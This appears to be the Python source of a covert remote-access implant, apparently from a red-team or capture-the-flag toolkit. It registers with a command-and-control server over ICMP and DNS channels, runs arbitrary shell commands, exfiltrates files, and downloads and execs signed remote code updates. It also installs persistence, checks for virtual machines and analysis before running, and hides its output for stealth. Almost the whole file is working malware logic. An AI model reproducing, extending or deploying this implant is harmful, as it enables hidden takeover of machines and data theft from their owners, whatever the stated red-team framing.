import time
import logging
import signal
import sys
import platform
import asyncio
import os
import json
import base64
import uuid
import hmac
import hashlib
import zlib  # For compression in updates
from datetime import datetime
from core.channels import ChannelManager
from core.crypto import AdaptiveCrypto
from core.scheduler import AdaptiveScheduler
from utilities.anti_analysis import AntiAnalysis
from utilities.fingerprint import SystemFingerprint
from core.persistence import PersistenceManager
from cryptography.hazmat.primitives.ciphers.aead import ChaCha20Poly1305
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.backends import default_backend

# Stub for tasks directory; in production, create tasks/__init__.py with modules
# Example: tasks/shell.py would define class ShellCommand(CommandModule)
# Here, we'll simulate with a registry dict for simplicity; expand to dynamic import

class CommandModule:
    """Base for modular commands"""
    def __init__(self, name: str):
        self.name = name
    
    def execute(self, args: dict, implant) -> dict:
        raise NotImplementedError

class ShellCommand(CommandModule):
    def __init__(self):
        super().__init__('shell')
    
    def execute(self, args: dict, implant) -> dict:
        import subprocess
        cmd = args.get('cmd', '')
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        return {
            'stdout': result.stdout,
            'stderr': result.stderr,
            'returncode': result.returncode
        }

class DownloadCommand(CommandModule):
    def __init__(self):
        super().__init__('download')
    
    def execute(self, args: dict, implant) -> dict:
        return implant.handle_download(args.get('path', ''))

class UploadCommand(CommandModule):
    def __init__(self):
        super().__init__('upload')
    
    def execute(self, args: dict, implant) -> dict:
        return implant.handle_upload(args.get('data', ''), args.get('path', ''))

class InfoCommand(CommandModule):
    def __init__(self):
        super().__init__('info')
    
    def execute(self, args: dict, implant) -> dict:
        return implant.fingerprint.collect_detailed()

class UpdateCommand(CommandModule):
    def __init__(self):
        super().__init__('update')
    
    def execute(self, args: dict, implant) -> dict:
        """Handle server-initiated update"""
        code_data = args.get('code', '')
        signature = args.get('signature', '')
        if implant._apply_update(code_data, signature):
            return {'success': True, 'message': 'Update applied'}
        return {'success': False, 'error': 'Update failed'}

class CommandRegistry:
    """Modular task loader"""
    def __init__(self):
        self.modules = {}
        self._load_modules()
    
    def _load_modules(self):
        # Dynamic load from tasks/ folder (simulate; in prod: importlib)
        self.modules['shell'] = ShellCommand()
        self.modules['download'] = DownloadCommand()
        self.modules['upload'] = UploadCommand()
        self.modules['info'] = InfoCommand()
        self.modules['update'] = UpdateCommand()  # New: For server-triggered updates
        # Add more: e.g., os.walk('tasks/') and importlib.import_module
    
    def get_module(self, command: str) -> CommandModule:
        return self.modules.get(command)

class BaseImplant:
    def __init__(self, config: dict):
        self.config = config
        self.setup_logging()
        self.anti_analysis = AntiAnalysis()
        self.fingerprint = SystemFingerprint()
        self.implant_id = str(uuid.uuid4())  # Unique ID for C2 registration
        self.crypto = AdaptiveCrypto(
            config['shared_secret'],
            context=self.fingerprint.get_system_id()
        )
        self.scheduler = AdaptiveScheduler(config.get('scheduler', {}))
        self.persistence = PersistenceManager(config.get('persistence', {}))
        self.channel_manager = ChannelManager()
        self.command_registry = CommandRegistry()  # Modular tasks
        
        self.setup_channels()
        self.setup_signal_handlers()
        
        # Stealth configuration
        self.stealth_enabled = config.get('stealth', True)
        self.stealth_level = config.get('stealth_level', 'medium')
        
        # C2 integration config
        self.update_interval = config.get('update_poll_interval', 10)  # Beacons between polls
        self.beacon_count = 0
        self.update_namespace = {}  # Sandbox for in-memory updates
    
    def setup_logging(self):
        """Setup covert logging with JSON for forensics"""
        logging.basicConfig(
            level=logging.ERROR,
            format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
        )
        self.logger = logging.getLogger(__name__)
        
        # Add JSON handler for job logging (red team forensics)
        from logging.handlers import RotatingFileHandler
        if self.config.get('log_jobs', True):
            job_handler = RotatingFileHandler('ghostgraph_jobs.json', maxBytes=10**6, backupCount=1)
            formatter = logging.Formatter('{"task_id": "%(task_id)s", "exec_ts": "%(asctime)s", "uuid": "%(uuid)s", "level": "%(levelname)s", "message": "%(message)s"}')
            job_handler.setFormatter(formatter)
            self.logger.addHandler(job_handler)
    
    def setup_signal_handlers(self):
        """Handle signals gracefully"""
        def signal_handler(sig, frame):
            self.cleanup()
            sys.exit(0)
            
        signal.signal(signal.SIGINT, signal_handler)
        signal.signal(signal.SIGTERM, signal_handler)
        
    def setup_channels(self):
        """Register and initialize channels"""
        from channels.icmp_advanced import AdvancedICMPChannel
        from channels.dns_covert import DNSCovertChannel
        from channels.multi_channel import MultiChannel
        
        self.channel_manager.register_channel('icmp', AdvancedICMPChannel)
        self.channel_manager.register_channel('dns', DNSCovertChannel)
        self.channel_manager.register_channel('multi', MultiChannel)
        
        channel_config = self.config['channel']
        self.channel = self.channel_manager.create_channel(
            channel_config['type'],
            channel_config,
            self.crypto
        )
    
    async def register_with_c2(self):
        """Send registration beacon to C2 server"""
        reg_data = {
            'type': 'register',
            'implant_id': self.implant_id,
            'fingerprint': self.fingerprint.collect(),
            'timestamp': time.time()
        }
        success = await self.channel.send_command(reg_data, self.implant_id)
        if success:
            self.logger.info("Registered with C2", extra={'implant_id': self.implant_id})
        return success
    
    async def health_check_channel(self, max_retries: int = 3):
        """Channel health check with retry/fallback"""
        for attempt in range(max_retries):
            if await self.channel.is_available():
                self.logger.info(f"Channel {self.channel.__class__.__name__} available on attempt {attempt + 1}")
                return True
            else:
                self.logger.warning(f"Channel unavailable on attempt {attempt + 1}; retrying...")
                await asyncio.sleep(2 ** attempt)  # Exponential backoff
                # Fallback to next channel
                fallback = await self.channel_manager.get_available_channel()
                if fallback:
                    self.channel = fallback
                    return True
        self.logger.error("All channels failed; aborting")
        return False
    
    def install_persistence(self):
        """Install appropriate persistence mechanism"""
        if not self.anti_analysis.detect_virtualization():
            self.persistence.install()
    
    def verify_command_signature(self, command_data: dict) -> bool:
        """Simulated auth: Verify HMAC signature"""
        expected_sig = command_data.get('signature')
        if not expected_sig:
            return False
        task_id = command_data.get('task_id', '')
        message = task_id.encode() + json.dumps(command_data, sort_keys=True).encode()
        computed_sig = hmac.new(
            self.config['shared_secret'].encode(),
            message,
            hashlib.sha256
        ).hexdigest()
        return hmac.compare_digest(expected_sig, computed_sig)
    
    def execute_command(self, command_data: dict):
        """Execute command with modular registry, signature, and job logging"""
        if not self.verify_command_signature(command_data):
            self.logger.error("Invalid command signature")
            return {'error': 'Unauthorized'}
        
        command = command_data.get('command')
        task_id = command_data.get('task_id', str(uuid.uuid4()))
        args = command_data.get('args', {})
        exec_ts = datetime.utcnow().isoformat()
        job_uuid = str(uuid.uuid4())
        
        # Log job for forensics
        self.logger.info(
            f"Executing {command}",
            extra={'task_id': task_id, 'exec_ts': exec_ts, 'uuid': job_uuid}
        )
        
        try:
            module = self.command_registry.get_module(command)
            if module:
                output = module.execute(args, self)
            else:
                output = {'error': f'Unknown command: {command}'}
            
            # Send response
            response = {
                'type': 'result',
                'task_id': task_id,
                'data': output,
                'exec_ts': exec_ts,
                'job_uuid': job_uuid
            }
            self.channel.send_command(response, task_id)
            self.scheduler.record_success()
            
            # Log success
            self.logger.info(
                "Command executed successfully",
                extra={'task_id': task_id, 'uuid': job_uuid}
            )
            
        except Exception as e:
            error_output = {'error': str(e)}
            self.channel.send_command({
                'type': 'result',
                'task_id': task_id,
                'data': error_output,
                'exec_ts': exec_ts,
                'job_uuid': job_uuid
            }, task_id)
            self.logger.error(
                f"Command execution failed: {e}",
                extra={'task_id': task_id, 'uuid': job_uuid}
            )
            self.scheduler.record_failure()
    
    def encrypt_disk_io(self, data: bytes) -> bytes:
        """Encrypt data for disk I/O using ChaCha20"""
        key = hashlib.sha256(self.config['shared_secret'].encode()).digest()[:32]
        nonce = os.urandom(12)
        chacha = ChaCha20Poly1305(key)
        ciphertext = chacha.encrypt(nonce, data, None)
        return nonce + ciphertext  # Prepend nonce
    
    def decrypt_disk_io(self, encrypted_data: bytes) -> bytes:
        """Decrypt data from disk I/O"""
        nonce = encrypted_data[:12]
        ciphertext = encrypted_data[12:]
        key = hashlib.sha256(self.config['shared_secret'].encode()).digest()[:32]
        chacha = ChaCha20Poly1305(key)
        return chacha.decrypt(nonce, ciphertext, None)
    
    def handle_download(self, path: str) -> dict:
        """Encrypted download"""
        try:
            with open(path, 'rb') as f:
                data = f.read()
            # Encrypt before exfil (CTF realism)
            encrypted_data = self.encrypt_disk_io(data)
            return {'success': True, 'data': base64.b64encode(encrypted_data).decode()}
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def handle_upload(self, data: str, path: str) -> dict:
        """Encrypted upload"""
        try:
            import base64
            encrypted_data = base64.b64decode(data)
            decrypted_data = self.decrypt_disk_io(encrypted_data)
            with open(path, 'wb') as f:
                f.write(decrypted_data)
            return {'success': True}
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    async def self_update(self, poll_only: bool = False):
        """Expanded in-memory self-update with C2 integration"""
        if poll_only:
            # Periodic poll: Send request beacon
            update_req = {
                'type': 'update_request',
                'implant_id': self.implant_id,
                'current_version': self.config.get('version', '1.0'),
                'timestamp': time.time()
            }
            await self.channel.send_command(update_req, self.implant_id)
            # Listen for response (update payload)
            response = await self.channel.receive_response(self.implant_id)
            if response and response.get('type') == 'update_payload':
                return await self._apply_update_from_response(response)
            return False
        
        # Full update from command/args
        code_data = self.config.get('update_code', '')  # Or from args
        signature = self.config.get('update_signature', '')
        return self._apply_update(code_data, signature)
    
    async def _apply_update_from_response(self, response: dict) -> bool:
        """Apply update received from C2 response"""
        code_data = response.get('code', '')
        signature = response.get('signature', '')
        return self._apply_update(code_data, signature)
    
    def _apply_update(self, code_data: str, signature: str) -> bool:
        """Decrypt, validate, and apply update in sandbox"""
        try:
            # Decrypt (assumes server encrypted with shared_secret)
            decrypted_compressed = self.crypto.decrypt(code_data, self.implant_id)
            if not decrypted_compressed:
                return False
            
            # Decompress
            code_bytes = zlib.decompress(decrypted_compressed.encode())
            code_str = code_bytes.decode()
            
            # Validate HMAC (server-signed code)
            message = code_str.encode()
            expected_sig = hmac.new(
                self.config['shared_secret'].encode(),
                message,
                hashlib.sha256
            ).hexdigest()
            if not hmac.compare_digest(signature, expected_sig):
                self.logger.error("Update signature invalid")
                return False
            
            # Apply in sandboxed namespace (e.g., new module or globals update)
            sandbox_globals = {'__builtins__': {k: v for k, v in __builtins__.__dict__.items() if k not in ['eval', 'exec', 'compile']}}  # Restricted
            sandbox_globals.update(self.update_namespace)
            exec(code_str, sandbox_globals)
            
            # Example: If update defines a new function, make it available
            if 'new_command' in sandbox_globals:
                self.command_registry.modules['new'] = sandbox_globals['new_command']()
            
            self.logger.info("Update applied successfully")
            self.config['version'] = self.config.get('version', '1.0') + '.1'  # Bump version
            return True
            
        except Exception as e:
            self.logger.error(f"Update application failed: {e}")
            return False
    
    def _apply_stealth(self):
        """Platform-specific stealth application"""
        system = platform.system().lower()
        if system == 'linux':
            from .linux_implant import apply_linux_stealth
            apply_linux_stealth(self)
        elif system == 'windows':
            from .windows_implant import apply_windows_stealth
            apply_windows_stealth(self)
        elif system == 'darwin':  # macOS
            from .macos_implant import apply_macos_stealth
            apply_macos_stealth(self)
        # Cross-platform: Silence output if high level
        if self.stealth_level == 'high':
            sys.stdout = open(os.devnull, 'w')
            sys.stderr = open(os.devnull, 'w')
    
    async def async_run(self):
        """Async main implant loop with safety checks and C2 integration"""

        # 🔐 Anti-analysis BEFORE anything else (OPSEC-first)
        if not self.anti_analysis.should_continue():
            self.logger.warning("Analysis detected on startup; exiting for OPSEC")
            return

        # Health check before loop
        if not await self.health_check_channel():
            sys.exit(1)

        # Initial registration with C2
        await self.register_with_c2()

        # Install persistence (but only after clean anti-analysis gate)
        self.install_persistence()

        # Background update polling
        if self.config.get('self_update', False):
            asyncio.create_task(self._periodic_update_poll())

        # 🔁 Main loop
        while True:
            try:
                # Runtime anti-analysis check
                if not self.anti_analysis.should_continue():
                    self.logger.warning("Runtime analysis detected; cleaning up and exiting")
                    self.cleanup()
                    return

                self.beacon_count += 1

                # Beacon
                if await self.channel.beacon():
                    response = await self.channel.receive_response(self.implant_id)
                    if response and response.get('type') == 'command':
                        self.execute_command(response)
                    else:
                        self.scheduler.record_success()
                else:
                    self.scheduler.record_failure()

                await asyncio.sleep(self.scheduler.calculate_delay())

            except KeyboardInterrupt:
                break
            except Exception as e:
                self.logger.error(f"Implant error: {e}")
                self.scheduler.record_failure()
                await asyncio.sleep(300)
    
    async def _periodic_update_poll(self):
        """Background task: Poll C2 for updates every N beacons"""
        while True:
            await asyncio.sleep(self.update_interval * self.scheduler.calculate_delay())  # Scaled sleep
            await self.self_update(poll_only=True)
    
    def run(self):
        """Sync wrapper for async run"""
        if self.stealth_enabled:
            self._apply_stealth()
        asyncio.run(self.async_run())
    
    def cleanup(self):
        """Cleanup before exit"""
        self.persistence.remove()
        # Additional cleanup tasks
        self.channel.teardown()
